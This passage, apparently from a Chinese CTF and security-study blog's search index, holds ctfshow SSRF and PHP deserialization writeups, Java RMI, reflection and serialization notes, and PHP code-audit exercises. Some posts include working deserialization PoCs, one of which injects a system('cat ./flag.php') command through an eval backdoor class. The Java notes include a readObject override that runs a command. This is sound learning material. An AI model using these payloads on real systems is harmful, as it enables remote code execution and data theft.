methods&#x3D;[‘POST’])\n@app.route(“&#x2F;ftpcheck”)\n这两个路由，通过DNS污染，完成SSRF提权，执行shell\n但是我SSRF不会\n离谱。学习一下\n","categories":["writeups"],"tags":["RCE","LFI","无数字字母","DNS污染","FTP","nodeJs"]},{"title":"ctfshow_ssrf","url":"/2023/05/18/ctfshow-ssrf/","content":"web351 &lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#x27;url&#x27;];$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);?&gt; \n\n\n\ncurl_init()：初始curl会话\ncurl_setopt()：会话设置\ncurl_exec()：执行curl会话,获取内容\ncurl_close()：会话关闭\n\n就是直接可以请求一个网页，然后可以发现底下有 flag.php，但是只有本地能访问，因此在这里我们让 curl 去请求 127.0.0.1/flag.php 即可。\n在之前做过的题目种，我们已经初步接触过本地网页限制访问资源的例子，但是我们都可以伪造，比如 referer 字段或者是 X-Forwarded-for 字段，因为包含在我们请求的 headers 中，因此我们可以直接伪造。但是 $_SERVER 就是我们所不能伪造的了，这个变量是什么呢？\n\n$_SERVER 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。这个数组中的项目由 Web 服务器创建。不能保证每个服务器都提供全部项目；服务器可能会忽略一些，或者提供一些没有在这里列举出来的项目。这也就意味着大量的此类变量都会在» CGI 1.1 规范中说明，所以应该仔细研究一下。\n\n所以我们对 SERVER 变量进行校验即可判断请求是否来自本地，如果不来自本地则直接拒绝掉。\n&lt;?php if($_SERVER[&#x27;SERVER_ADDR&#x27;]!==&#x27;127.0.0.1&#x27;)&#123;    die(&#x27;非本地访问&#x27;);&#125;echo(&#x27;flag&#123;test_flag&#125;&#x27;);?&gt;\n\n\nweb352\n不写了，环境好像都有问题\n这个答案明显就是不符合的\n","categories":["writeups"],"tags":["ssrf","ctfshow"]},{"title":"ctfshow反序列化","url":"/2023/06/03/ctfshow%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","content":"web254 &lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-12-02 17:44:47# @Last Modified by:   h1xa# @Last Modified time: 2020-12-02 19:29:02# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);highlight_file(__FILE__);include(&#x27;flag.php&#x27;);class ctfShowUser&#123;    public $username=&#x27;xxxxxx&#x27;;    public $password=&#x27;xxxxxx&#x27;;    public $isVip=false;    public function checkVip()&#123;        return $this-&gt;isVip;    &#125;    public function login($u,$p)&#123;        if($this-&gt;username===$u&amp;&amp;$this-&gt;password===$p)&#123;            $this-&gt;isVip=true;        &#125;        return $this-&gt;isVip;    &#125;    public function vipOneKeyGetFlag()&#123;        if($this-&gt;isVip)&#123;            global $flag;            echo &quot;your flag is &quot;.$flag;        &#125;else&#123;            echo &quot;no vip, no flag&quot;;        &#125;    &#125;&#125;$username=$_GET[&#x27;username&#x27;];$password=$_GET[&#x27;password&#x27;];if(isset($username) &amp;&amp; isset($password))&#123;    $user = new ctfShowUser();    if($user-&gt;login($username,$password))&#123;        if($user-&gt;checkVip())&#123;            $user-&gt;vipOneKeyGetFlag();        &#125;    &#125;else&#123;        echo &quot;no vip,no flag&quot;;    &#125;&#125;\n\n核心判断：if($this-&gt;username&#x3D;&#x3D;&#x3D;$u&amp;&amp;$this-&gt;password&#x3D;&#x3D;&#x3D;$p)\n就是xxxxxx\n\nweb255&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-12-02 17:44:47# @Last Modified by:   h1xa# @Last Modified time: 2020-12-02 19:29:02# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);highlight_file(__FILE__);include(&#x27;flag.php&#x27;);class ctfShowUser&#123;    public $username=&#x27;xxxxxx&#x27;;    public $password=&#x27;xxxxxx&#x27;;    public $isVip=false;    public function checkVip()&#123;        return $this-&gt;isVip;    &#125;    public function login($u,$p)&#123;        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;    &#125;    public function vipOneKeyGetFlag()&#123;        if($this-&gt;isVip)&#123;            global $flag;            echo &quot;your flag is &quot;.$flag;        &#125;else&#123;            echo &quot;no vip, no flag&quot;;        &#125;    &#125;&#125;$username=$_GET[&#x27;username&#x27;];$password=$_GET[&#x27;password&#x27;];if(isset($username) &amp;&amp; isset($password))&#123;    $user = unserialize($_COOKIE[&#x27;user&#x27;]);        if($user-&gt;login($username,$password))&#123;        if($user-&gt;checkVip())&#123;            $user-&gt;vipOneKeyGetFlag();        &#125;    &#125;else&#123;        echo &quot;no vip,no flag&quot;;    &#125;&#125; \n\n不一样的点在login函数没有判断了\n看到有个地方可以传入cookie\n整合一下，我们的环境源码过不了了是因为#isVip是false\n如果我们改为true再传入xxxxxx给username和password后面的判断就可以和上一题一样全部通过了\npoc\n&lt;?phpclass ctfShowUser&#123;//    public $username=&#x27;xxxxxx123&#x27;;//    public $password=&#x27;xxxxxx&#x27;;    public $isVip=true;&#125;echo urlencode(serialize(new ctfShowUser()));\n\n\nweb256 &lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-12-02 17:44:47# @Last Modified by:   h1xa# @Last Modified time: 2020-12-02 19:29:02# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);highlight_file(__FILE__);include(&#x27;flag.php&#x27;);class ctfShowUser&#123;    public $username=&#x27;xxxxxx&#x27;;    public $password=&#x27;xxxxxx&#x27;;    public $isVip=false;    public function checkVip()&#123;        return $this-&gt;isVip;    &#125;    public function login($u,$p)&#123;        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;    &#125;    public function vipOneKeyGetFlag()&#123;        if($this-&gt;isVip)&#123;            global $flag;            if($this-&gt;username!==$this-&gt;password)&#123;                    echo &quot;your flag is &quot;.$flag;              &#125;        &#125;else&#123;            echo &quot;no vip, no flag&quot;;        &#125;    &#125;&#125;$username=$_GET[&#x27;username&#x27;];$password=$_GET[&#x27;password&#x27;];if(isset($username) &amp;&amp; isset($password))&#123;    $user = unserialize($_COOKIE[&#x27;user&#x27;]);        if($user-&gt;login($username,$password))&#123;        if($user-&gt;checkVip())&#123;            $user-&gt;vipOneKeyGetFlag();        &#125;    &#125;else&#123;        echo &quot;no vip,no flag&quot;;    &#125;&#125;\n\n这道题问题在于多了一个 if($this-&gt;username!&#x3D;&#x3D;$this-&gt;password)强人所难的一个东西。\n但是还好，就是我们重构一下username和password就好了\npoc\n&lt;?phpclass ctfShowUser&#123;    public $username=&#x27;xxxxxx123&#x27;;    public $password=&#x27;xxxxxx&#x27;;    public $isVip=true;&#125;echo urlencode(serialize(new ctfShowUser()));\n\n\nweb257 &lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-12-02 17:44:47# @Last Modified by:   h1xa# @Last Modified time: 2020-12-02 20:33:07# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);highlight_file(__FILE__);class ctfShowUser&#123;    private $username=&#x27;xxxxxx&#x27;;    private $password=&#x27;xxxxxx&#x27;;    private $isVip=false;    private $class = &#x27;info&#x27;;    public function __construct()&#123;        $this-&gt;class=new info();    &#125;    public function login($u,$p)&#123;        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;    &#125;    public function __destruct()&#123;        $this-&gt;class-&gt;getInfo();    &#125;&#125;class info&#123;    private $user=&#x27;xxxxxx&#x27;;    public function getInfo()&#123;        return $this-&gt;user;    &#125;&#125;class backDoor&#123;    private $code;    public function getInfo()&#123;        eval($this-&gt;code);    &#125;&#125;$username=$_GET[&#x27;username&#x27;];$password=$_GET[&#x27;password&#x27;];if(isset($username) &amp;&amp; isset($password))&#123;    $user = unserialize($_COOKIE[&#x27;user&#x27;]);    $user-&gt;login($username,$password);&#125;\n\nhttps://blog.csdn.net/qq_45300786/article/details/108462663#:~:text=%E5%AF%B9%E8%B1%A1%E8%A7%A6%E5%8F%91%E5%92%8C%E5%AF%B9%E8%B1%A1%E8%A7%A6%E5%8F%91%E5%AE%8C%EF%BC%8C%E8%87%AA%E5%8A%A8%E9%94%80%E6%AF%81%E3%80%82,%E6%89%80%E4%BB%A5%E5%8F%AA%E6%9C%89_construct%20%E5%92%8C_destruct%E6%98%BE%E7%A4%BA\n魔术方法调用\n&lt;?phpclass ctfShowUser&#123;    private $username=&#x27;xxxxxx&#x27;;    private $password=&#x27;xxxxxx&#x27;;    private $class = &#x27;&#x27;;    public function __construct()&#123;        $this-&gt;class=new backDoor();    &#125;&#125;class backDoor&#123;    private $code=&#x27;system(&quot;cat ./flag.php&quot;);&#x27;;&#125;echo(urlencode(serialize(new ctfShowUser)));\n\nPOC\nweb258 &lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-12-02 17:44:47# @Last Modified by:   h1xa# @Last Modified time: 2020-12-02 21:38:56# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);highlight_file(__FILE__);class ctfShowUser&#123;    public $username=&#x27;xxxxxx&#x27;;    public $password=&#x27;xxxxxx&#x27;;    public $isVip=false;    public $class = &#x27;info&#x27;;    public function __construct()&#123;        $this-&gt;class=new info();    &#125;    public function login($u,$p)&#123;        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;    &#125;    public function __destruct()&#123;        $this-&gt;class-&gt;getInfo();    &#125;&#125;class info&#123;    public $user=&#x27;xxxxxx&#x27;;    public function getInfo()&#123;        return $this-&gt;user;    &#125;&#125;class backDoor&#123;    public $code;    public function getInfo()&#123;        eval($this-&gt;code);    &#125;&#125;$username=$_GET[&#x27;username&#x27;];$password=$_GET[&#x27;password&#x27;];if(isset($username) &amp;&amp; isset($password))&#123;    if(!preg_match(&#x27;/[oc]:\\d+:/i&#x27;, $_COOKIE[&#x27;user&#x27;]))&#123;        $user = unserialize($_COOKIE[&#x27;user&#x27;]);    &#125;    $user-&gt;login($username,$password);&#125;\n\n","categories":["writeups"],"tags":["反序列化","ctfshow"]},{"title":"hgame-week1","url":"/2023/05/11/hgame-week1/","content":"[HGAME 2023 week1]Classic Childhood Game\n经典前端游戏题，细心点找js代码都可以\n","categories":["writeups"],"tags":["thinkphp","反序列化"]},{"title":"java_rmi基本操作","url":"/2023/07/21/java-rmi%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/","content":"前言面试挂了，虽然是因为老板觉得我年龄太小，怕是暑假共干不久，但是千万种原因还是得归结于自身，要是自己水平天下第一高，谁又在乎别的呢？就是自己卡在了及格线罢了\n继续Java的学习，学习java越来越发现基础很重要，所以这里回顾一下RMI\n什么是RMI远程调用，为什么会出现这个东西，其实就是客户端想要运行别的地方的java代码，这是一个刚需。\n\n这里有个图，大致原理就是RMI有一个服务端，我们的客户客户端想要运行一个没有的代码，去向RMI服务端要，比如一个对象，这个怎么去要呢？他怎么知道要哪个呢？或者说，服务端怎么知道要给哪个，这里就出现了一个叫注册中心的东西，所有的服务要通过注册中心进行查询，注册中心也会为这些对象动态的绑定端口，这样就不会出现端口冲突的情况\n代码我看白神的课程，自己把代码敲了一遍\n他的代码分客户端和服务端，在自己的主机上面模拟了远程调用\nserverIRemoteObj\npackage org.example;import java.rmi.Remote;import java.rmi.RemoteException;public interface IRemoteObj extends Remote &#123;    public String sayHello(String keywords) throws RemoteException;&#125;\n\n这里创建了一个接口，接收了一个String类型的参数，这里注意一定是要继承Remote类\nRemoteObjImpl\npackage org.example;import java.rmi.RemoteException;import java.rmi.server.UnicastRemoteObject;public class RemoteObjImpl extends UnicastRemoteObject implements IRemoteObj &#123;    public RemoteObjImpl() throws RemoteException &#123;    &#125;    @Override    public String sayHello(String keywords)&#123;        String upKeywords=keywords.toUpperCase();        System.out.println(upKeywords);        return upKeywords;    &#125;&#125;\n\n这里java类进行了实现，继承UnicastRemoteObject，实现上面的IRmoteObj\n同时重写了sayHello方法，实现了接口\nRMIServer\npackage org.example;import java.rmi.AlreadyBoundException;import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;public class RMIServer &#123;    public static void main(String[] args) throws RemoteException, AlreadyBoundException &#123;        IRemoteObj remoteObj=new RemoteObjImpl();        Registry r= LocateRegistry.createRegistry(1099);        r.bind(&quot;remoteObj&quot;,remoteObj);    &#125;&#125;\n\n这里是主类，throws RemoteException, AlreadyBoundException这个是一定要的，虽然我不知道为什么，可能会报错把\n然后创建了一个对象，\n注意\nRegistry r= LocateRegistry.createRegistry(1099);\n\n这里是创建了一个注册中心，注册中心本身的端口是1099，这个端口用来连接客户端，有了这一个端口，服务端就可以正常被来连接\nr.bind(&quot;remoteObj&quot;,remoteObj);\n\n这个就是一个绑定\ncilentIRemoteObj\npackage org.example;import java.rmi.Remote;import java.rmi.RemoteException;public interface IRemoteObj extends Remote &#123;    public String sayHello(String keywords) throws RemoteException;&#125;\n\n客户端创建一个接口\nRMIClient\npackage org.example;import java.rmi.NotBoundException;import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;public class  RMIClient &#123;    public static void main(String[] args) throws RemoteException, NotBoundException &#123;        Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;,1099);        IRemoteObj remoteObj =(IRemoteObj) registry.lookup(&quot;remoteObj&quot;);        remoteObj.sayHello(&quot;hello&quot;);    &#125;&#125;\n\n这里是客户端主要代码用注册中心进行ip和端口的连接\n然后后lookup方法去找对象\n最后进行调用\n结尾简单的demo，用来理解rmi的基本工作原理\n","categories":["java"],"tags":["java","RMI"]},{"title":"java-反射","url":"/2023/07/14/java-%E5%8F%8D%E5%B0%84/","content":"前言前面一段时间都在忙着准备面试，加上比较懒，也不知道后面会不会有心情写一个面试总结到这里来。但是学习是这辈子都不会停止的，要从这里开始继续记录java的学习。有一些java的很基础的东西我都记录在自己的xmind上了，懒得传上来了，这里从反射开始记录，反射还是很重要的嘞。从现在开始我也会尽量减少文字描述，但是增强逻辑性连贯性，做一个优质笔记者\n反射由来的思考java中提供了一种机制，这个机制可以帮助我们动态的获取和操作java类。有一个简单的问题，反射为什么要存在，这个东西允许我们通过实例，反推出泛型，利用其中的属性，方法，甚至是私有的都没有问题，这对于我们来说是前所未有的好事，因为操控了这些东西，反序列化攻击，利用等等仿佛都是轻而易举的事情。那为什么oracle会干这样的事情呢？\nUses of ReflectionReflection is commonly used by programs which require the ability to examine or modify the runtime behavior of applications running in the Java virtual machine. This is a relatively advanced feature and should be used only by developers who have a strong grasp of the fundamentals of the language. With that caveat in mind, reflection is a powerful technique and can enable applications to perform operations which would otherwise be impossible.    Extensibility FeaturesAn application may make use of external, user-defined classes by creating instances of extensibility objects using their fully-qualified names.Class Browsers and Visual Development EnvironmentsA class browser needs to be able to enumerate the members of classes. Visual development environments can benefit from making use of type information available in reflection to aid the developer in writing correct code.Debuggers and Test ToolsDebuggers need to be able to examine private members on classes. Test harnesses can make use of reflection to systematically call a discoverable set APIs defined on a class, to insure a high level of code coverage in a test suite.\n\n这是官方文档的描述\n简单来说就是为了开发更加简单。\n反射的利用先上我的利用学习poc\nimport java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.Method;public class ReflectionTest &#123;    public static void main(String[] args) throws Exception&#123;         Person person =new Person();         Class c=person.getClass();         //利用反射获取泛型类，然后获取构造方法，然后正常取构造实体         Constructor personConstructor= c.getConstructor(String.class,int.class);         Person p=(Person) personConstructor.newInstance(&quot;Dr0se&quot;,20);         System.out.println(p);         //获取属性 获取可以利用泛型来处理         Field[] personfields=c.getDeclaredFields();         for(Field f:personfields)&#123;             System.out.println(f);         &#125;         //修改属性 修改则不一样，必须修改实例，也就是有值的实例，不然我修改他干嘛         Field namefield=c.getField(&quot;name&quot;);         namefield.set(p,&quot;Dr0se-mirror1&quot;);         System.out.println(p);        Field agefield=c.getDeclaredField(&quot;age&quot;);        namefield.set(p,&quot;Dr0se-mirror2&quot;);        agefield.setAccessible(true);//这里权限的打开很重要        agefield.set(p,19);        System.out.println(p);//        Method[] personMethods= c.getMethods();//        for(Method m:personMethods)&#123;//            System.out.println(m);//        &#125;          Method actionMethod=c.getDeclaredMethod(&quot;action&quot;, String.class);//这里需要在输入实例类，后面一个参数给出参数类型          actionMethod.setAccessible(true);          actionMethod.invoke(p,&quot;Dr0se love zhenzhen&quot;);    &#125;&#125;\n\n首先反射类肯定是有一个包的就是 java.lang.reflect.*\n反射的利用的核心思想就是利用实例反推出Class泛型，利用这个泛型进行反射操作\n我的poc里面写出了对于属性的获取，改操作还有方法的调用操作\n首先我的最开始的语句里面核心的东西就是\nClass c=person.getClass();\n\n这里利用实体类获取到了泛型c。这里我觉得是反射的核心，是基础。\n//利用反射获取泛型类，然后获取构造方法，然后正常取构造实体        Constructor personConstructor= c.getConstructor(String.class,int.class);        Person p=(Person) personConstructor.newInstance(&quot;Dr0se&quot;,20);        System.out.println(p);        //获取属性 获取可以利用泛型来处理        Field[] personfields=c.getDeclaredFields();        for(Field f:personfields)&#123;            System.out.println(f);        &#125;\n\n可以看到我利用c泛型反射带上的getConstructor方法获取了person类的构造方法，进而构造出来了person的实例p，同时利用了newinstance方法构造实例，赋值属性\n我为了看看这个泛型，我对其属性也进行了遍历输出，但是这里看到\nField[] personfields=c.getDeclaredFields();\n\n首先这里是用数组进行接收，然后需要注意的地方是getDeclaredFields()方法，这里加了Declared就是可以获取私有，没有就只有public\n//修改属性 修改则不一样，必须修改实例，也就是有值的实例，不然我修改他干嘛        Field namefield=c.getField(&quot;name&quot;);        namefield.set(p,&quot;Dr0se-mirror1&quot;);        System.out.println(p);       Field agefield=c.getDeclaredField(&quot;age&quot;);       namefield.set(p,&quot;Dr0se-mirror2&quot;);       agefield.setAccessible(true);//这里权限的打开很重要       agefield.set(p,19);       System.out.println(p);\n\n其余修改属性的代码\n也是一摸一样的用法，调用set方法完成修改，然后注意，pravite方法需要我们去用Declared同时需要去开启权限\n最后是方法的获取\nMethod actionMethod=c.getDeclaredMethod(&quot;action&quot;, String.class);//这里需要在输入实例类，后面一个参数给出参数类型          actionMethod.setAccessible(true);          actionMethod.invoke(p,&quot;Dr0se love zhenzhen&quot;);\n\n这里需要注意的是，我们在获取方法的时候，除了方法名，也要给他方法的参数，不然就是不知道的\n然后我们需要调用invoke方法，这里和魔术方法反序列化没有个p关系\n结尾反射的大概其实就是这些，后续有遇到的会继续更新修改。\n现在还在等面试结果，还要个两三天，紧张捏。也不知道后面还有多少时间继续学习。\n","categories":["java"],"tags":["java","反射"]},{"title":"java_rmi服务端创建调试","url":"/2023/07/21/java-rmi%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%88%9B%E5%BB%BA%E8%B0%83%E8%AF%95/","content":"前言继续学习rmi，这里开始一个很恶心的调试，不一定对，我自己反复琢磨了两三遍，记录一下调试心得\n代码\n还是和上篇博客一模一样的代码，因为这里我只想了解一下客户端的创建，不管注册中心和绑定，所以直接注释\n调试\n直接step in。这里是父类，实现类。\n\n继续就会发现他给了一个port默认是0\n我们的port赋值给了this.port 并且出现了一个exportObject,这是一个导出对象的一个类，看起来很重要，继续调试\n\n调用了一个super方法\n这个super方法我没看出来有什么用，里面是在给ref赋值为null\n\n一直step in下去，可以看到一个这个调用，有一个liveRef\n\n\n这里自动获取了我们的ip还有默认的port\n\n这里是有一个createProxy函数，明显是要给我们创建代理\n\n这里还有一个函数检测是否继承与java.rmi.Remote\n后面很多调试都是和这个一样做继承检测\n\n这里之后端口就是有了变换，也就是TCPENDpoint随机分配了端口\n继续可以看到\n\n这一步之后会调用\nUnicastServerRef这个，一个用户客户端一个用于服务端。\nUnicastRef是UnicastServerRef的父类，UnicastServerRef继承UnicastRef使用于服务端，后者直接使用于客户端。\n\n\n然后我们进入了target类里面，不难看出，他把所有和封装有关系的包括客户端代理都放到了这里面\n\n这里面一直用的都是liveref的赋值，这一个liveref类几乎走完了一整个调试流程\n同时这里也创建了线程，后面的服务就是在这里开始等待\n\n这里就是在transport类里面发出服务\n总结一下，在服务端创建远程对象过程中，核心为LiveRef，LiveRef对象中包含了远程对象占用的地址和端口，以及对象UID。当一个远程对象被创建时，会生成一个服务器本地的RemoteObject对象，它持有一个UnicastServerRef对象，UnicastServerRef对象持有一个LiveRef对象；远程对象被创建时，还会生成一个UnicastRef对象，并封装到stub代理中，它持有与UnicastServerRef相同的LiveRef，stub后续发布到注册表，以供客户端使用。\n最后写的很烂，主要是调试能力不行，还有很多是错误的，凑合着看吧，后续能力增长会去改进的\n","categories":["java"],"tags":["java","RMI"]},{"title":"java_反序列化和序列化","url":"/2023/07/23/java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%BA%8F%E5%88%97%E5%8C%96/","content":"前言学习cc链的时候，发现自己对于java序列化反序列化的真正含义还是不太理解，，最近也是感觉记忆力不太好了，很多刚刚学完的东西却记不住，只能多多复习和温故，这一篇简单的知识会一笔带过，主要还是帮助温故一些知识。\n序列化与反序列化这里就不用说了，都烂了，就是转换形式方便传输，序列化一个东西变成一个什么，然后再反序列化返回变回来\n一点点代码public static void serialize(Object obj) throws IOException&#123;       ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));//读取文件       oos.writeObject(obj);   &#125;\n\npublic static  Object unserialze(String Filename) throws IOException,ClassNotFoundException&#123;     ObjectInputStream ois =new ObjectInputStream(new FileInputStream(Filename));     Object obj =ois.readObject();     return obj; &#125;\n\n这里自己写了java的序列化和反序列化的类，只需要再main函数里面调用就可以\n这里面也是可以看出来，是吧类序列化成为一个文件，然后反序列化也是需要读取一个filename，就可以把这个对象反序列化回来\n反序列化漏洞的两种思想想要触发漏洞，这里就是可以思考两个方向，因为我们最后反序列化的时候一定会调用readObject类，那我们想要搞事情就一定是在这里做文章\n1.readObject类被重写，里面就有任意代码的执行，或者是危险函数\n2.readObject类包含一个类,这个类又反复包含一个新类,最后有一条链子直接通向了危险函数\n1import java.io.IOException;import java.io.ObjectInputStream;import java.io.Serializable;public class Person implements Serializable &#123;//实现这个接口的类才可以序列化//    private transient String name;    public  String name;    private int age;    public static int id;    static &#123;        System.out.println(&quot;静态代码块&quot;);    &#125;    public static void staticAction()&#123;        System.out.println(&quot;静态方法&quot;);    &#125;    &#123;        System.out.println(&quot;构造代码块&quot;);    &#125;    public Person()&#123;        System.out.println(&quot;person&quot;);    &#125;    public Person(String name,int age)&#123;        System.out.println(&quot;有参person&quot;);        this.name=name;        this.age=age;    &#125;    @Override    public String toString()&#123;        return &quot;Person&#123;&quot;+                &quot;name=&#x27;&quot;+name+&#x27;\\&#x27;&#x27;+                &quot;, age=&quot;+age+                &#x27;&#125;&#x27;;    &#125;    private void action(String act)&#123;        System.out.println(act);    &#125;    private void  readObject(ObjectInputStream ois) throws IOException,ClassNotFoundException&#123;        ois.defaultReadObject();        Runtime.getRuntime().exec(&quot;calc&quot;);    &#125;&#125;\n\n比如这里就是我直接在需要序列化和反序列化的person类里面重写了readObject方法\n直接就是调用计算器,但是这样想想也是一般做不到的,谁没事重写这个还写个恶意的代码\n","categories":["java"],"tags":["反序列化","java","序列化"]},{"title":"php_bugs-master-1到5","url":"/2023/05/09/php-bugs-master-1%E5%88%B05/","content":"前言代码审计得从基础做起。今天逛github找到了一个看起来还不错的项目php_bugs。star还是挺多的学习一下\n环境搭建问题想要可以有web in server。phpstorm本身我没有跑起来，有个简单方法，可以放到phpstudy里面跑起来。这个实测是很简单的。\n01 extract变量覆盖.php&lt;?phperror_reporting(0);$flag=&#x27;xxx&#x27;; extract($_GET); if(isset($shiyan)) &#123;     $content=trim(file_get_contents($flag));    if($shiyan==$content)    &#123;         echo&#x27;ctf&#123;xxx&#125;&#x27;;     &#125;   else   &#123;     echo&#x27;Oh.no&#x27;;   &#125;    &#125;?&gt;\n\nextract函数得看看是什么\n\nextract() 函数从数组中将变量导入到当前的符号表。该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。该函数返回成功设置的变量数目。\n好像很不太懂，感觉就是把值赋给变量巴拉巴拉\n这里举个例子\n\n大概是可以理解了\n也就是说我们通过$GET传参，对应的参数和值会被当作数组，然后就可以啊吧啊吧\n\n进入这个if，emmmm\n不传值就好了，可是有小可爱会问。不传值，isset怎么半\n在PHP中，null和空是两个不同的概念。\n\n看看我传的参\n再看看我修改的源码\n\n我们想要flag，很简单，flag变量随便输入，因为我们没有文件\n结束\nextract()会将$flag和$shiyan的值覆盖了，将变量的值设置为空或者不存在的文件就满足$shiyan== $content。\n02 绕过过滤的空白字符&lt;?php $info = &quot;&quot;; $req = [];$flag=&quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;; ini_set(&quot;display_error&quot;, false); //为一个配置选项设置值error_reporting(0); //关闭所有PHP错误报告 if(!isset($_GET[&#x27;number&#x27;]))&#123;   header(&quot;hint:26966dc52e85af40f59b4fe73d8c323a.txt&quot;); //HTTP头显示hint 26966dc52e85af40f59b4fe73d8c323a.txt    die(&quot;have a fun!!&quot;); //die — 等同于 exit() &#125; foreach([$_GET, $_POST] as $global_var) &#123;  //foreach 语法结构提供了遍历数组的简单方式     foreach($global_var as $key =&gt; $value) &#123;         $value = trim($value);  //trim — 去除字符串首尾处的空白字符（或者其他字符）        is_string($value) &amp;&amp; $req[$key] = addslashes($value); // is_string — 检测变量是否是字符串，addslashes — 使用反斜线引用字符串    &#125; &#125;   function is_palindrome_number($number) &#123;     $number = strval($number); //strval — 获取变量的字符串值    $i = 0;     $j = strlen($number) - 1; //strlen — 获取字符串长度    while($i &lt; $j) &#123;         if($number[$i] !== $number[$j]) &#123;             return false;         &#125;         $i++;         $j--;     &#125;     return true; &#125;   if(is_numeric($_REQUEST[&#x27;number&#x27;])) //is_numeric — 检测变量是否为数字或数字字符串 &#123;    $info=&quot;sorry, you cann&#x27;t input a number!&quot;; &#125;elseif($req[&#x27;number&#x27;]!=strval(intval($req[&#x27;number&#x27;]))) //intval — 获取变量的整数值&#123;      $info = &quot;number must be equal to it&#x27;s integer!! &quot;;   &#125;else&#123;      $value1 = intval($req[&quot;number&quot;]);     $value2 = intval(strrev($req[&quot;number&quot;]));        if($value1!=$value2)&#123;          $info=&quot;no, this is not a palindrome number!&quot;;     &#125;     else     &#123;           if(is_palindrome_number($req[&quot;number&quot;]))&#123;              $info = &quot;nice! &#123;$value1&#125; is a palindrome number!&quot;;           &#125;          else          &#123;             $info=$flag;          &#125;     &#125; &#125; echo $info;\n\n慢慢看吧有点长\nif(!isset($_GET[&#x27;number&#x27;]))&#123;   header(&quot;hint:26966dc52e85af40f59b4fe73d8c323a.txt&quot;); //HTTP头显示hint 26966dc52e85af40f59b4fe73d8c323a.txt    die(&quot;have a fun!!&quot;); //die — 等同于 exit() &#125;\n\n这里就是用来检测有没有number这个参数\n不然给你一个hint然后让你die\nforeach([$_GET, $_POST] as $global_var) &#123;  //foreach 语法结构提供了遍历数组的简单方式     foreach($global_var as $key =&gt; $value) &#123;         $value = trim($value);  //trim — 去除字符串首尾处的空白字符（或者其他字符）        is_string($value) &amp;&amp; $req[$key] = addslashes($value); // is_string — 检测变量是否是字符串，addslashes — 使用反斜线引用字符串    &#125; &#125; \n\n接下来来了两个foreach循环\n用foreach循环遍历$_GET和$_POST数组，将参数值去除首尾空格，并且使用addslashes()函数将参数值中的特殊字符进行转义，以防止SQL注入等攻击\n其实这里就要有一个思想，get，post传参传进来的东西，都可以当作数组处理\n\nfunction is_palindrome_number($number) &#123;     $number = strval($number); //strval — 获取变量的字符串值    $i = 0;     $j = strlen($number) - 1; //strlen — 获取字符串长度    while($i &lt; $j) &#123;         if($number[$i] !== $number[$j]) &#123;             return false;         &#125;         $i++;         $j--;     &#125;     return true; &#125; \n\n这是一个回文串检测的函数，emmmm，这么简单就不解释了吧\nif(is_numeric($_REQUEST[&#x27;number&#x27;])) //is_numeric — 检测变量是否为数字或数字字符串 &#123;    $info=&quot;sorry, you cann&#x27;t input a number!&quot;; &#125;\n\nelseif($req[&#x27;number&#x27;]!=strval(intval($req[&#x27;number&#x27;]))) //intval — 获取变量的整数值&#123;      $info = &quot;number must be equal to it&#x27;s integer!! &quot;;   &#125;\n\n这里是把输入转换为数字又变为字符串，再比较，检查其是否为一个合法的整数。如果输入不是整数，则会将 $info 变量设置为错误消息字符串。\n代码很复杂我们进行一下简化，再把思路整合一下\n$info = &quot;&quot;; $req = [];$flag=&quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;;//三个变量if(!isset($_GET[&#x27;number&#x27;]))//number参数得有if(is_numeric($_REQUEST[&#x27;number&#x27;])) //is_numeric — 检测变量是否为数字或数字字符串 $req[&#x27;number&#x27;]!=strval(intval($req[&#x27;number&#x27;]))//判断为整数$value1 = intval($req[&quot;number&quot;]);$value2 = intval(strrev($req[&quot;number&quot;]));  //两个变量，反转字符串if($value1!=$value2)&#123;          $info=&quot;no, this is not a palindrome number!&quot;;     &#125;    